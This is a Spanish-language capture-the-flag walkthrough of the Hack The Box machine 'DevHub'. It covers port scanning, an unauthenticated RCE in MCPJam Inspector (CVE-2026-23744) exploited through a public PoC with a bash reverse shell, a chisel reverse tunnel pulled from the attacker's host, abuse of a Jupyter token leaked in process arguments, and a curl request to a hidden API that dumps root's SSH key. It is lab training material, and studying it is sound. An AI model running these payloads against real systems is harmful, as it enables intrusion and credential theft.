# HTB | DevHub

**Machine** - DevHub
**OS** - Linux
**Difficulty** - Medium
**IP** - 10.129.3.242
**Fecha** - 1/6/2026

![hecho](hecho.png)

---

## 1. Enumeración (Reconnaissance)

### Escaneo de Puertos (Nmap)

Comenzamos la fase de reconocimiento realizando un escaneo de puertos exhaustivo sobre la máquina objetivo. El objetivo es identificar todos los puertos abiertos (`-p-`), determinar los servicios y versiones que corren en ellos (`-sCV`), y hacerlo de la manera más rápida posible enviando no menos de 5000 paquetes por segundo (`--min-rate=5000`).

```bash
nmap -sCV -p- --min-rate=5000 -oN nmap.txt 10.129.3.242
```

```text
# Nmap 7.99 scan initiated Mon Jun  1 06:39:28 2026 as: nmap -sCV -p- --min-rate=5000 -oN nmap.txt 10.129.3.242
Nmap scan report for devhut.htb (10.129.3.242)
Host is up (0.045s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Mon, 01 Jun 2026 06:40:06 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Mon, 01 Jun 2026 06:40:06 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.99%I=7%D=6/1%Time=6A1D2946%P=x86_64-pc-linux-gnu%r(Get
SF:Request,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Mon,\x2001\x20Jun\x202026\x
SF:2006:40:06\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/s
SF:vg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x2
SF:0\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-D
SF:RYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>\
SF:n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content\
SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Mon,\x2001\x20Jun\x20
SF:2026\x2006:40:06\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest
SF:,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
SF:UTF-8\r\nDate:\x20Mon,\x2001\x20Jun\x202026\x2006:40:06\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 06:40:15 2026 -- 1 IP address (1 host up) scanned in 46.93 seconds
```

El escaneo revela tres puertos interesantes:

* **22 (SSH):** Corriendo OpenSSH 8.9p1. Lo ignoramos por ahora al carecer de credenciales.
* **80 (HTTP):** Un servidor web nginx que redirige al dominio `devhub.htb`. Deberemos añadir este dominio a nuestro archivo `/etc/hosts`.
* **6274 (Unknown):** Un servicio web desconocido. Nmap ha logrado extraer el código fuente de la página de inicio, revelando el título `MCPJam Inspector` y referencias a una aplicación web *frontend* construida en React/Vite.

Añadimos el dominio a nuestro archivo de resolución:

```bash
sudo vim /etc/hosts
# Añadimos la línea: 10.129.3.242 devhub.htb
```

### Enumeración Web (Puerto 80)

Al acceder a `http://devhub.htb`, nos encontramos con un portal estático que detalla la infraestructura interna de desarrollo y un análisis de la empresa.

![Portal DevHub](cap1.PNG)

El portal actúa como un panel de información que nos aporta datos sobre cómo está organizada la máquina internamente. Entre los datos expuestos vemos:

* Un **MCP Inspector** corriendo en el puerto `6274`.
* Un **Analytics Dashboard** basado en Jupyter, pero que está restringido únicamente a acceso interno (`localhost:8888`). Tomamos nota de esto, ya que será un objetivo claro si logramos comprometer la máquina y necesitamos pivotar.
* El stack tecnológico: Node.js, Python 3, Jupyter, y Ubuntu 24.04.

Dado que la página no ofrece ninguna funcionalidad interactiva, procedemos a realizar un Fuzzing con la herramienta `dirsearch` para descartar paneles de administración ocultos:

```bash
dirsearch -u http://devhub.htb/
```

```text
  _|. _ _  _  _  _ _|_    v0.5.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://devhub.htb/

[06:42:31] Scanning: 
[06:44:02] 200 -    3KB - /index.html

Task Completed
```

Al no encontrar nuevos directorios, realizamos un descubrimiento de *VHOSTS* mediante `gobuster`. En entornos corporativos es muy común que un mismo servidor web aloje diferentes aplicaciones bajo distintos subdominios.

```bash
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devhub.htb/ --append-domain
```

```text
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 20000 / 20000 (100.00%)
===============================================================
Finished
===============================================================
```

Tanto la enumeración de directorios como la de vhosts nos devuelven resultados limpios. Esto nos confirma al 100% que el vector de entrada no reside en el servidor web estándar, sino el servicio desplegado en el puerto `6274`.

---

## 2. Acceso Inicial (Foothold)

### CVE-2026-23744 - Unauthenticated RCE en MCPJam

Al acceder al puerto `6274` a través de nuestro navegador, identificamos la interfaz de **MCPJam Inspector**. Revisando el panel, descubrimos que la versión corriendo es la **v1.4.2**.

![Versión MCPJam](cap2.png)

Una rápida búsqueda de vulnerabilidades para esta versión nos revela que es vulnerable a **CVE-2026-23744**, un fallo crítico que permite la Ejecución Remota de Código (RCE) sin necesidad de autenticación.

Para explotarlo, utilizaremos un PoC público escrito en Python ([Repositorio GitHub](https://github.com/d3vn0mi/CVE-2026-23744-POC)). Antes de lanzarlo, es imperativo dejar un listener de Netcat a la escucha en nuestra máquina atacante por el puerto que deseemos (en este caso, el 4444):

```bash
nc -lvnp 4444
```

Una vez con el listener preparado, ejecutamos el exploit pasándole la IP víctima y nuestro payload (una reverse shell clásica de bash):

```bash
python3 exploit.py -t 10.129.4.61 -c "bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'"
```

```text
     _____ _   _ _____      ____   ___ ____   __        ____  _____ ______ _  _  _  _
  / ____| \ | |  ___|    |___ \ / _ \___ \ / /_      |___ \|___ /|____  | || || || |
 | |    |  \| | |__    ___  __) | | | |__) | '_ \ _____ __) | |_ \   / /| || || || |
 | |    | . ` |  __| |___||__ <| | | |__ <| (_) |_____|__ < ___) | / / |__   _   _|
 | |____|_|\__|  |___      ___) | |_| |__) |\___/     ___) |____/ / /     | | | |
  \_____|     |_____|     |____/ \___/____/           |____/      /_/      |_| |_|

  [ MCP Server Unauthenticated RCE — Proof of Concept ]
  [ Author: d3vn0mi | For authorised security testing only ]

  [*] Probing 10.129.4.61:6274 (timeout 30s) ...
  [+] Target is up and reachable.

  [*] Target URL : http://10.129.4.61:6274/api/mcp/connect
  [*] Command    : bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'
  [*] Server ID  : rce_exploit

  [*] Sending exploit payload ...
```

Volvemos a nuestra pestaña de Netcat y vemos que hemos recibido la conexión, obteniendo acceso al sistema como el usuario `mcp-dev`:

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.4.61 56080
bash: cannot set terminal process group (1073): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
mcp-dev
```

![Shell obtenida](cap3.png)

### Análisis de la vulnerabilidad

El éxito de este ataque radica en una mala implementación del *endpoint* de la API y una falta absoluta de sanitización de *inputs*. Si analizamos el código del PoC de Python, la magia ocurre en la función `build_payload`:

```python
def build_payload(command, server_id="rce_exploit"):
    """Construct the malicious serverConfig payload."""
    return {
        "serverConfig": {
            "command": "sh",
            "args": ["-c", command],
            "env": {
                "DISPLAY": os.environ.get("DISPLAY", ":0"),
            },
        },
        "serverId": server_id,
    }
```

El flujo técnico de la vulnerabilidad es el siguiente:

1. **El propósito legítimo:** El endpoint `/api/mcp/connect` está diseñado para recibir un JSON con la configuración de un servidor de IA (Model Context Protocol). Espera un binario en el campo `command` (por ejemplo, `node` o `python`) y sus respectivos argumentos en `args`.
2. **Inyección de Comandos:** Dado que el backend toma estos valores y los pasa directamente al sistema operativo (probablemente a través de una función como `child_process.spawn` en Node.js), nosotros podemos manipular el comportamiento esperado.
3. **El secuestro de la ejecución:** En lugar de decirle a la API que inicie un servidor MCP legítimo, el exploit le indica que el comando a ejecutar es el intérprete del sistema (`sh`) y le pasa como argumento (`-c`) nuestro propio comando malicioso (la reverse shell).
4. **Resultado:** El servidor de desarrollo ejecuta ciegamente nuestra shell, conectando la máquina víctima de vuelta hacia nuestro puerto a la escucha.

---

## 3. Movimiento Lateral (Pivotando a analyst)

Una vez que hemos estabilizado nuestra shell y verificado que somos el usuario `mcp-dev`, el siguiente paso lógico es enumerar el sistema en busca de vectores para escalar privilegios o movernos lateralmente hacia otros usuarios.

Una de las primeras comprobaciones que siempre debemos hacer es listar los procesos que se están ejecutando en el sistema, prestando especial atención a servicios internos, procesos de otros usuarios o credenciales pasadas como argumentos en la línea de comandos.

Ejecutamos `ps -aux` para listar todos los procesos:

```bash
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ps -aux
```

```text
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 166372 11788 ?        Ss   08:16   0:01 /sbin/init
...
analyst     1072  0.1  2.4 182532 96552 ?        Ss   08:16   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
mcp-dev     1073  0.0  1.5 1511420 63872 ?       Ssl  08:16   0:00 npm start
...
```

Al revisar detenidamente la salida, detectamos un proceso sumamente interesante ejecutado por el usuario `analyst`. Se trata del servidor **Jupyter-Lab** (del cual teníamos constancia gracias al portal web inicial).

Este hallazgo es crítico por dos razones:

1. El servicio está escuchando localmente en el puerto `8888` (`--ip=127.0.0.1 --port=8888`), lo que significa que solo es accesible desde la propia máquina víctima.
2. **Filtración de credenciales:** El desarrollador pasó el token de autenticación directamente como un argumento en la línea de comandos (`--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`). Esto es una mala práctica de seguridad conocida como *Process Command Line Leak*, ya que cualquier usuario del sistema puede leer los argumentos de ejecución de otros procesos mediante `ps` o leyendo el directorio `/proc`.

Para confirmar los puertos locales abiertos, ejecutamos `ss -tlnp`:

```bash
mcp-dev@devhub:/tmp$ ss -tlnp                                                  
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                                                         
LISTEN 0      128        127.0.0.1:5000      0.0.0.0:* LISTEN 0      128        127.0.0.1:8888      0.0.0.0:* LISTEN 0      511          0.0.0.0:80        0.0.0.0:* LISTEN 0      128          0.0.0.0:22        0.0.0.0:* LISTEN 0      511          0.0.0.0:6274      0.0.0.0:* users:(("node-MainThread",pid=1275,fd=29))
```

Efectivamente, los puertos `8888` (Jupyter) y `5000` (desconocido por ahora) están escuchando en localhost.

### Reverse Port Forwarding con Chisel

Para interactuar cómodamente con la interfaz web de Jupyter-Lab (y utilizar nuestro propio navegador en la máquina atacante), necesitamos crear un túnel que exponga ese puerto local `8888` hacia nuestra máquina. Utilizaremos **Chisel**, una excelente herramienta para crear túneles TCP cifrados.

Primero, levantamos un servidor HTTP temporal en nuestra máquina atacante para compartir el binario de Chisel:

```bash
# En la máquina atacante (IP: <TU_IP>)
python3 -m http.server 8000
```

Descargamos el binario en la máquina víctima (usaremos el directorio `/tmp` que tiene permisos de escritura general):

```bash
mcp-dev@devhub:/tmp$ wget http://<TU_IP>:8000/chisel.sh
mcp-dev@devhub:/tmp$ chmod +x chisel.sh
```

A continuación, levantamos el servidor de Chisel en nuestra máquina atacante en el puerto `9001` habilitando la opción de túnel inverso (`--reverse`):

```bash
# En la máquina atacante
chisel server -p 9001 --reverse
```

```text
2026/06/01 09:31:52 server: Reverse tunnelling enabled
2026/06/01 09:31:52 server: Fingerprint 0q4JiWA3NFVSBZmv+N4ib55YK6rR8njazlhLY+sTacw=
2026/06/01 09:31:52 server: Listening on http://0.0.0.0:9001
```

Finalmente, ejecutamos el cliente de Chisel en la máquina víctima. Le indicamos que se conecte a nuestro servidor (`<TU_IP>:9001`) y que redirija el puerto remoto (`R`) `8888` hacia su propio `127.0.0.1:8888`.

```bash
mcp-dev@devhub:/tmp$ ./chisel.sh client <TU_IP>:9001 R:8888:127.0.0.1:8888
```

```text
2026/06/01 09:33:17 client: Connecting to ws://<TU_IP>:9001
2026/06/01 09:33:18 client: Connected (Latency 46.30068ms)
```

En nuestra máquina atacante veremos la confirmación de la conexión:

```text
2026/06/01 09:33:18 server: session#1: tun: proxy#R:8888=>8888: Listening
```

### Explotación del Panel de Jupyter

Con el túnel establecido, abrimos nuestro navegador web y navegamos hacia `http://127.0.0.1:8888`. Para saltarnos la pantalla de login, añadimos el token filtrado directamente en la URL:

`http://127.0.0.1:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

![Panel Jupyter](cap4.png)

Una vez dentro, el entorno de Jupyter nos permite ejecutar comandos en el sistema subyacente con los privilegios del usuario que inició el servicio. Para obtener una shell, simplemente nos dirigimos al menú superior y seleccionamos: **File > New > Terminal**.

Esto nos abrirá una consola interactiva en la propia interfaz web. Comprobamos nuestra identidad y capturamos la primera flag:

```bash
analyst@devhub:~$ whoami
analyst
analyst@devhub:~$ ls
jupyter-env  notebooks  user.txt
analyst@devhub:~$ cat user.txt
[REDACTED]
```

![Flag User](cap5.png)

---

## 4. Escalada de Privilegios (Root)

Con el usuario `analyst` bajo nuestro control, volvemos a la terminal para buscar vías de escalada hacia `root`. Durante nuestra enumeración inicial de procesos, recordamos haber visto un servicio corriendo en el puerto local `5000` (`ss -tlnp`), y un proceso misterioso llamado `/opt/opsmcp/server.py` que se ejecutaba con altos privilegios.

Como `analyst`, verificamos los permisos de este script:

```bash
analyst@devhub:~$ ls -la /opt/opsmcp/server.py
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py
```

El archivo pertenece a nuestro usuario (`analyst`), lo que nos permite leer su contenido. Al inspeccionar el código fuente del script con `cat` (o preferiblemente con `vim` para tener resaltado de sintaxis), nos encontramos con una API desarrollada en Flask:

```python
# ... [Fragmento de código omitido para brevedad] ...

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# ...

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    # ...
}

# ...

    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
# ...
```

### Análisis de la Vulnerabilidad (Hardcoded Credentials & Security by Obscurity)

Auditar este código nos revela múltiples fallos críticos de seguridad:

1. **Credenciales Hardcodeadas:** La clave de la API (`VALID_API_KEY`) está escrita en texto plano dentro del código fuente. Cualquiera que pueda leer el archivo (nosotros) puede autenticarse.
2. **Seguridad por Oscuridad:** El desarrollador intentó ocultar funciones críticas (`ops._admin_dump`) asumiendo que si no aparecían listadas en el endpoint público, nadie las encontraría.
3. **Exposición de Archivos Críticos:** La función oculta `ops._admin_dump`, cuando recibe el objetivo `ssh_keys` y la confirmación `confirm: true`, lee directamente la clave privada RSA del usuario `root` (`/root/.ssh/id_rsa`) y la devuelve en la respuesta JSON. Como el script de Flask se está ejecutando como `root`, tiene permisos para leer ese archivo.

### Explotación (Obteniendo la clave de Root)

Dado que la API escucha en `127.0.0.1:5000`, podemos interactuar con ella localmente utilizando `curl`. Formateamos una petición HTTP POST hacia el endpoint `/tools/call`, inyectamos la API key capturada en las cabeceras, y pasamos el JSON malicioso (o en este caso, "legítimo" pero no autorizado) que solicita la clave SSH.

Usamos un pequeño one-liner de Python (`python3 -c "import sys, json; print(json.load(sys.stdin)['root_private_key'])"`) al final del comando `curl` para parsear limpiamente el JSON y que la clave se imprima con los saltos de línea correctos.

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' | python3 -c "import sys, json; print(json.load(sys.stdin)['root_private_key'])"
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
[... recortado ...]
-----END OPENSSH PRIVATE KEY-----
```

![Salida curl clave RSA](cap6.png)

### Acceso Final

Copiamos toda la clave RSA proporcionada por el servidor, abrimos una nueva pestaña en nuestra máquina atacante y la guardamos en un archivo (por ejemplo, `ssh.txt`).

Es crucial recordar que SSH exige que las claves privadas tengan permisos restrictivos, por lo que debemos aplicar un `chmod 600` antes de usarla. Finalmente, nos conectamos por SSH como `root`.

```bash
# En la máquina atacante
nvim ssh.txt
# (Pegamos el contenido de la clave)

chmod 600 ssh.txt 
ssh root@10.129.3.242 -i ssh.txt 
```

```text
The authenticity of host '10.129.3.242 (10.129.3.242)' can't be established.
ED25519 key fingerprint is: SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.3.242' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

root@devhub:~# whoami
root
root@devhub:~# ls
root.txt  snap
root@devhub:~# cat root.txt
[REDACTED]
```

![Flag Root](cap7.png)


---
<div align="center">
  <small>
    © 2026 David Veiga (D4vKry). Este trabajo está distribuido bajo una licencia <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.es" target="_blank">CC BY-NC-SA 4.0</a>.
  </small>
</div>